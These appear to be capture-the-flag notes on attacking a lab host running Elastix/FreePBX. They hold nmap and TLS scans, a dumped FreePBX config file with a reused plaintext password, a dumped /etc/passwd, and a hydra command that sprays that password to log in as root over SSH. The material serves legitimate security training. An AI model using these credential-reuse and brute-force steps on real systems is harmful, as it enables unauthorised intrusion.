# Firefox Old TLS Version

`about:config`
![](images/Pasted%20image%2020250927085654.png)


# Nmap

```bash
> nmap -Pn -p- --min-rate 4000 10.10.10.7
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-04 08:22 +0700
Nmap scan report for 10.10.10.7
Host is up (0.17s latency).
Not shown: 65519 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
793/tcp   open  unknown
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4190/tcp  open  sieve
4445/tcp  open  upnotifyp
4559/tcp  open  hylafax
5038/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt
```

```bash
> nmap -Pn -p22,25,280,110,111,143,443,793,993,995,3306 -sCV 10.10.10.7
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-04 08:25 +0700
Nmap scan report for 10.10.10.7
Host is up (0.17s latency).

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp   open   smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
110/tcp  open   pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: APOP PIPELINING AUTH-RESP-CODE STLS TOP UIDL IMPLEMENTATION(Cyrus POP3 server v2) RESP-CODES LOGIN-DELAY(0) USER EXPIRE(NEVER)
111/tcp  open   rpcbind    2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            790/udp   status
|_  100024  1            793/tcp   status
143/tcp  open   imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: MAILBOX-REFERRALS ID RIGHTS=kxte CHILDREN OK ATOMIC NAMESPACE X-NETSCAPE RENAME LIST-SUBSCRIBED IMAP4rev1 CONDSTORE LISTEXT CATENATE IDLE ANNOTATEMORE THREAD=REFERENCES IMAP4 Completed BINARY SORT UNSELECT MULTIAPPEND SORT=MODSEQ URLAUTHA0001 UIDPLUS THREAD=ORDEREDSUBJECT QUOTA ACL LITERAL+ NO STARTTLS
280/tcp  closed http-mgmt
443/tcp  open   ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2025-09-04T01:26:57+00:00; +3s from scanner time.
793/tcp  open   status     1 (RPC #100024)
993/tcp  open   ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp  open   pop3       Cyrus pop3d
3306/tcp open   mysql      MySQL (unauthorized)
Service Info: Hosts:  beep.localdomain, example.com

Host script results:
|_clock-skew: 2s
```

#kali
```bash
┌──(root㉿kali)-[~]
└─# nmap -Pn -p22,25,80,110,143,443 -sCV 10.10.10.7
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 01:29 UTC
Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.51% done; ETC: 01:29 (0:00:00 remaining)
Nmap scan report for 10.10.10.7
Host is up (0.19s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp  open  http     Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp open  pop3     Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: RESP-CODES LOGIN-DELAY(0) STLS USER PIPELINING AUTH-RESP-CODE EXPIRE(NEVER) IMPLEMENTATION(Cyrus POP3 server v2) APOP TOP UIDL
143/tcp open  imap     Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: Completed OK URLAUTHA0001 NAMESPACE UIDPLUS THREAD=ORDEREDSUBJECT NO LIST-SUBSCRIBED X-NETSCAPE CONDSTORE ANNOTATEMORE IMAP4rev1 ACL CATENATE ATOMIC RENAME QUOTA IDLE MULTIAPPEND MAILBOX-REFERRALS IMAP4 SORT=MODSEQ LISTEXT UNSELECT SORT THREAD=REFERENCES BINARY RIGHTS=kxte ID LITERAL+ STARTTLS CHILDREN
443/tcp open  ssl/http Apache httpd 2.2.3 ((CentOS))
|_ssl-date: 2025-09-04T01:29:46+00:00; +3s from scanner time.
|_http-title: Elastix - Login page
|_http-server-header: Apache/2.2.3 (CentOS)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
| http-robots.txt: 1 disallowed entry
|_/
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com
```
# Scan TLS versions supported

```bash
openssl s_client -connect 10.10.10.7:443 -tls1
openssl s_client -connect 10.10.10.7:443 -tls1_1

nmap --script ssl-enum-ciphers -p 443 10.10.10.7
```

```bash
> nmap --script ssl-enum-ciphers -p 443 10.10.10.7
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-04 08:37 +0700
Nmap scan report for 10.10.10.7
Host is up (0.17s latency).

PORT    STATE SERVICE
443/tcp open  https
| ssl-enum-ciphers:
|   SSLv3:
|     ciphers:
|       TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA (dh 1024) - F
|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA (dh 1024) - F
|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA (dh 1024) - F
|       TLS_DHE_RSA_WITH_DES_CBC_SHA (dh 1024) - F
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 1024) - F
|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 1024) - F
|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 1024) - F
|       TLS_RSA_WITH_DES_CBC_SHA (rsa 1024) - F
|       TLS_RSA_WITH_RC4_128_MD5 (rsa 1024) - F
|       TLS_RSA_WITH_RC4_128_SHA (rsa 1024) - F
|     compressors:
|       DEFLATE
|       NULL
|     cipher preference: client
|     warnings:
|       64-bit block cipher 3DES vulnerable to SWEET32 attack
|       64-bit block cipher DES vulnerable to SWEET32 attack
|       Broken cipher RC4 is deprecated by RFC 7465
|       CBC-mode cipher in SSLv3 (CVE-2014-3566)
|       Ciphersuite uses MD5 for message integrity
|       Insecure certificate signature (SHA1), score capped at F
|   TLSv1.0:
|     ciphers:
|       TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA (dh 1024) - F
|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA (dh 1024) - F
|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA (dh 1024) - F
|       TLS_DHE_RSA_WITH_DES_CBC_SHA (dh 1024) - F
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 1024) - F
|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 1024) - F
|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 1024) - F
|       TLS_RSA_WITH_DES_CBC_SHA (rsa 1024) - F
|       TLS_RSA_WITH_RC4_128_MD5 (rsa 1024) - F
|       TLS_RSA_WITH_RC4_128_SHA (rsa 1024) - F
|     compressors:
|       DEFLATE
|       NULL
|     cipher preference: client
|     warnings:
|       64-bit block cipher 3DES vulnerable to SWEET32 attack
|       64-bit block cipher DES vulnerable to SWEET32 attack
|       Broken cipher RC4 is deprecated by RFC 7465
|       Ciphersuite uses MD5 for message integrity
|       Insecure certificate signature (SHA1), score capped at F
|_  least strength: F
```

# /etc/amportal.conf

```
# This file is part of FreePBX.
#
#    FreePBX is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 2 of the License, or
#    (at your option) any later version.
#
#    FreePBX is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with FreePBX.  If not, see <http://www.gnu.org/licenses/>.
#
# This file contains settings for components of the Asterisk Management Portal
# Spaces are not allowed!
# Run /usr/src/AMP/apply_conf.sh after making changes to this file

# FreePBX Database configuration
# AMPDBHOST: Hostname where the FreePBX database resides
# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
# AMPDBUSER: Username used to connect to the FreePBX database
# AMPDBPASS: Password for AMPDBUSER (above)
# AMPENGINE: Telephony backend engine (e.g. asterisk)
# AMPMGRUSER: Username to access the Asterisk Manager Interface
# AMPMGRPASS: Password for AMPMGRUSER
#
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

# AMPBIN: Location of the FreePBX command line scripts
# AMPSBIN: Location of (root) command line scripts
#
AMPBIN=/var/lib/asterisk/bin
AMPSBIN=/usr/local/sbin

# AMPWEBROOT: Path to Apache's webroot (leave off trailing slash)
# AMPCGIBIN: Path to Apache's cgi-bin dir (leave off trailing slash)
# AMPWEBADDRESS: The IP address or host name used to access the AMP web admin
#
AMPWEBROOT=/var/www/html
AMPCGIBIN=/var/www/cgi-bin 
# AMPWEBADDRESS=x.x.x.x|hostname

# FOPWEBROOT: Path to the Flash Operator Panel webroot (leave off trailing slash)
# FOPPASSWORD: Password for performing transfers and hangups in the Flash Operator Panel
# FOPRUN: Set to true if you want FOP started by freepbx_engine (amportal_start), false otherwise
# FOPDISABLE: Set to true to disable FOP in interface and retrieve_conf.  Useful for sqlite3 
# or if you don't want FOP.
#
#FOPRUN=true
FOPWEBROOT=/var/www/html/panel
#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE

# FOPSORT=extension|lastname
# DEFAULT VALUE: extension
# FOP should sort extensions by Last Name [lastname] or by Extension [extension]

# This is the default admin name used to allow an administrator to login to ARI bypassing all security.
# Change this to whatever you want, don't forget to change the ARI_ADMIN_PASSWORD as well
ARI_ADMIN_USERNAME=admin

# This is the default admin password to allow an administrator to login to ARI bypassing all security.
# Change this to a secure password.
ARI_ADMIN_PASSWORD=jEhdIekWmdjE

# AUTHTYPE=database|none
# Authentication type to use for web admininstration. If type set to 'database', the primary
# AMP admin credentials will be the AMPDBUSER/AMPDBPASS above.
AUTHTYPE=database

# AMPADMINLOGO=filename
# Defines the logo that is to be displayed at the TOP RIGHT of the admin screen. This enables
# you to customize the look of the administration screen.
# NOTE: images need to be saved in the ..../admin/images directory of your AMP install
# This image should be 55px in height
AMPADMINLOGO=logo.png

# USECATEGORIES=true|false
# DEFAULT VALUE: true
# Controls if the menu items in the admin interface are sorted by category (true), or sorted 
# alphabetically with no categories shown (false).

# AMPEXTENSIONS=extensions|deviceanduser
# Sets the extension behavior in FreePBX.  If set to 'extensions', Devices and Users are
# administered together as a unified Extension, and appear on a single page.
# If set to 'deviceanduser', Devices and Users will be administered seperately.  Devices (e.g. 
# each individual line on a SIP phone) and Users (e.g. '101') will be configured 
# independent of each other, allowing association of one User to many Devices, or allowing 
# Users to login and logout of Devices.
AMPEXTENSIONS=extensions

# ENABLECW=true|false
ENABLECW=no
# DEFAULT VALUE: true
# Enable call waiting by default when an extension is created. Set to 'no' to if you don't want 
# phones to be commissioned with call waiting already enabled. The user would then be required
# to dial the CW feature code (*70 default) to enable their phone. Most installations should leave
# this alone. It allows multi-line phones to receive multiple calls on their line appearances.

# CWINUSEBUSY=true|false
# DEFAULT VALUE: true
# For extensions that have CW enabled, report unanswered CW calls as 'busy' (resulting in busy 
# voicemail greeting). If set to no, unanswered CW calls simply report as 'no-answer'.

# AMPBADNUMBER=true|false
# DEFAULT VALUE: true
# Generate the bad-number context which traps any bogus number or feature code and plays a
# message to the effect. If you use the Early Dial feature on some Grandstream phones, you
# will want to set this to false.

# AMPBACKUPSUDO=true|false
# DEFAULT VALUE: false
# This option allows you to use sudo when backing up files. Useful ONLY when using AMPPROVROOT
# Allows backup and restore of files specified in AMPPROVROOT, based on permissions in /etc/sudoers
# for example, adding the following to sudoers would allow the user asterisk to run tar on ANY file
# on the system:
#	asterisk localhost=(root)NOPASSWD: /bin/tar
#	Defaults:asterisk !requiretty
# PLEASE KEEP IN MIND THE SECURITY RISKS INVOLVED IN ALLOWING THE ASTERISK USER TO TAR/UNTAR ANY FILE

# CUSTOMASERROR=true|false
# DEFAULT VALUE: true
# If false, then the Destination Registry will not report unknown destinations as errors. This should be
# left to the default true and custom destinations should be moved into the new custom apps registry.

# DYNAMICHINTS=true|false
# DEFAULT VALUE: false
# If true, Core will not statically generate hints, but instead make a call to the AMPBIN php script, 
# and generate_hints.php through an Asterisk's #exec call. This requires Asterisk.conf to be configured 
# with "execincludes=yes" set in the [options] section.

# XTNCONFLICTABORT=true|false
# BADDESTABORT=true|false
# DEFAULT VALUE: false
# Setting either of these to true will result in retrieve_conf aborting during a reload if an extension
# conflict is detected or a destination is detected. It is usually better to allow the reload to go
# through and then correct the problem but these can be set if a more strict behavior is desired.

# SERVERINTITLE=true|false
# DEFAULT VALUE: false
# Precede browser title with the server name.

# USEDEVSTATE = true|false
# DEFAULT VALUE: false
# If this is set, it assumes that you are running Asterisk 1.4 or higher and want to take advantage of the
# func_devstate.c backport available from Asterisk 1.6. This allows custom hints to be created to support
# BLF for server side feature codes such as daynight, followme, etc.

# MODULEADMINWGET=true|false
# DEFAULT VALUE: false
# Module Admin normally tries to get its online information through direct file open type calls to URLs that
# go back to the freepbx.org server. If it fails, typically because of content filters in firewalls that
# don't like the way PHP formats the requests, the code will fall back and try a wget to pull the information.
# This will often solve the problem. However, in such environment there can be a significant timeout before
# the failed file open calls to the URLs return and there are often 2-3 of these that occur. Setting this
# value will force FreePBX to avoid the attempt to open the URL and go straight to the wget calls.

# AMPDISABLELOG=true|false
# DEFAULT VALUE: true
# Whether or not to invoke the FreePBX log facility

# AMPSYSLOGLEVEL=LOG_EMERG|LOG_ALERT|LOG_CRIT|LOG_ERR|LOG_WARNING|LOG_NOTICE|LOG_INFO|LOG_DEBUG|LOG_SQL|SQL
# DEFAULT VALUE: LOG_ERR
# Where to log if enabled, SQL, LOG_SQL logs to old MySQL table, others are passed to syslog system to
# determine where to log

# AMPENABLEDEVELDEBUG=true|false
# DEFAULT VALUE: false
# Whether or not to include log messages marked as 'devel-debug' in the log system

# AMPMPG123=true|false 
# DEFAULT VALUE: true
# When set to false, the old MoH behavior is adopted where MP3 files can be loaded and WAV files converted
# to MP3. The new default behavior assumes you have mpg123 loaded as well as sox and will convert MP3 files
# to WAV. This is highly recommended as MP3 files heavily tax the system and can cause instability on a busy
# phone system.

# CDR DB Settings: Only used if you don't use the default values provided by FreePBX.
# CDRDBHOST: hostname of db server if not the same as AMPDBHOST
# CDRDBPORT: Port number for db host 
# CDRDBUSER: username to connect to db with if it's not the same as AMPDBUSER
# CDRDBPASS: password for connecting to db if it's not the same as AMPDBPASS
# CDRDBNAME: name of database used for cdr records
# CDRDBTYPE: mysql or postgres mysql is default
# CDRDBTABLENAME: Name of the table in the db where the cdr is stored cdr is default 

# AMPVMUMASK=mask 
# DEFAULT VALUE: 077 
# Defaults to 077 allowing only the asterisk user to have any permission on VM files. If set to something
# like 007, it would allow the group to have permissions. This can be used if setting apache to a different
# user then asterisk, so that the apache user (and thus ARI) can have access to read/write/delete the
# voicemail files. If changed, some of the voicemail directory structures may have to be manually changed.

# DASHBOARD_STATS_UPDATE_TIME=integer_seconds
# DEFAULT VALUE: 6
# DASHBOARD_INFO_UPDATE_TIME=integer_seconds
# DEFAULT VALUE: 20
# These can be used to change the refresh rate of the System Status Panel. Most of
# the stats are updated based on the STATS interval but a few items are checked
# less frequently (such as Asterisk Uptime) based on the INFO value

# ZAP2DAHDICOMPAT=true|false
ZAP2DAHDICOMPAT=true
# DEFAULT VALUE: false
# If set to true, FreePBX will check if you have chan_dadhi installed. If so, it will
# automatically use all your ZAP configuration settings (devices and trunks) and
# silently convert them, under the covers, to DAHDI so no changes are needed. The
# GUI will continue to refer to these as ZAP but it will use the proper DAHDI channels.
# This will also keep Zap Channel DIDs working.

# CHECKREFERER=true|false
# DEFAULT VALUE: true
# When set to the default value of true, all requests into FreePBX that might possibly add/edit/delete
# settings will be validated to assure the request is coming from the server. This will protect the system
# from CSRF (cross site request forgery) attacks. It will have the effect of preventing legitimately entering
# URLs that could modify settings which can be allowed by changing this field to false.

# USEQUEUESTATE=true|false
# DEFAULT VALUE: false
# Setting this flag will generate the required dialplan to integrate with the following Asterisk patch:
# https://issues.asterisk.org/view.php?id=15168
# This feature is planned for a future 1.6 release but given the existence of the patch can be used prior. Once
# the release version is known, code will be added to automatically enable this format in versions of Asterisk
# that support it.

# USEGOOGLEDNSFORENUM=true|false
# DEFAULT VALUE: false
# Setting this flag will generate the required global variable so that enumlookup.agi will use Google DNS
# 8.8.8.8 when performing an ENUM lookup. Not all DNS deals with NAPTR record, but Google does. There is a
# drawback to this as Google tracks every lookup. If you are not comfortable with this, do not enable this
# setting. Please read Google FAQ about this: http://code.google.com/speed/public-dns/faq.html#privacy

# MOHDIR=subdirectory_name
# This is the subdirectory for the MoH files/directories which is located in ASTVARLIBDIR
# if not specified it will default to mohmp3 for backward compatibility.
MOHDIR=mohmp3
# RELOADCONFIRM=true|false
# DEFAULT VALUE: true
# When set to false, will bypass the confirm on Reload Box

# FCBEEPONLY=true|false
# DEFAULT VALUE: false
# When set to true, a beep is played instead of confirmation message when activating/de-activating:
# CallForward, CallWaiting, DayNight, DoNotDisturb and FindMeFollow

# DISABLECUSTOMCONTEXTS=true|false
# DEFAULT VALUE: false
# Normally FreePBX auto-generates a custom context that may be usable for adding custom dialplan to modify the
# normal behavior of FreePBX. It takes a good understanding of how Asterisk processes these includes to use
# this and in many of the cases, there is no useful application. All includes will result in a WARNING in the
# Asterisk log if there is no context found to include though it results in no errors. If you know that you
# want the includes, you can set this to true. If you comment it out FreePBX will revert to legacy behavior
# and include the contexts.

# AMPMODULEXML lets you change the module repository that you use. By default, it
# should be set to http://mirror.freepbx.org/ - Presently, there are no third
# party module repositories.
AMPMODULEXML=http://mirror.freepbx.org/

# AMPMODULESVN is the prefix that is appended to <location> tags in the XML file.
# This should be set to http://mirror.freepbx.org/modules/
AMPMODULESVN=http://mirror.freepbx.org/modules/

AMPDBNAME=asterisk

ASTETCDIR=/etc/asterisk
ASTMODDIR=/usr/lib/asterisk/modules
ASTVARLIBDIR=/var/lib/asterisk
ASTAGIDIR=/var/lib/asterisk/agi-bin
ASTSPOOLDIR=/var/spool/asterisk
ASTRUNDIR=/var/run/asterisk
ASTLOGDIR=/var/log/asteriskSorry! Attempt to access restricted file.
```

# /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
distcache:x:94:94:Distcache:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
dbus:x:81:81:System message bus:/:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
spamfilter:x:500:500::/home/spamfilter:/bin/bash
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
fanis:x:501:501::/home/fanis:/bin/bash
```

# SSH Client Config

```bash
Host 10.10.10.7
   KexAlgorithms +diffie-hellman-group-exchange-sha1
   HostKeyAlgorithms +ssh-rsa
   MACs +hmac-sha1,hmac-md5
```

```bash
❯ hydra -L users.txt -p jEhdIekWmdjE 10.10.10.7 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-27 09:26:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:10/p:1), ~1 try per task
[DATA] attacking ssh://10.10.10.7:22/
[22][ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-27 09:26:55
```

